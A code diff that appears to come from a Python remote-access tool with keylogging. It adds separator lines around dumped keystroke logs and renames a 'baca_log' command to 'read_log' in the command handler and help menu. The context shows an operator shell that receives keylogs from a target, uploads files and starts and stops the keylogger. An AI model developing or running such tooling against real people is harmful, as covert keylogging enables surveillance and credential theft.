@@ -130,6 +130,7 @@ def recv_keylog(_target):
     try:
         _target.settimeout(10.0)
         cprint("[+] Dumping logs:", 'yellow')
+        cprint("=============================", 'yellow')
         raw_data = _target.recv(1024)
 
         if not raw_data:
@@ -138,6 +139,7 @@ def recv_keylog(_target):
         data = raw_data.decode()
         _target.settimeout(None)
         print(data)
+        cprint("=============================", 'yellow')
     
     except socket.timeout:
         cprint("[-] No dump received, continuing", 'red')
@@ -404,7 +406,7 @@ def shellc(_target):
                 upload_file(_target, perintah[7:])
             elif perintah == 'start_log':
                 start_log()
-            elif perintah == 'baca_log':
+            elif perintah == 'read_log':
                 baca_log(_target)
             elif perintah == 'stop_log':
                 stop_log()
@@ -441,7 +443,7 @@ keylogging:
 ================================
  -start_log >> start keylogger
 
- -baca_log  >> read keylogger
+ -read_log  >> read keylogger
 
  -stop_log  >> stop keylogger
 ================================
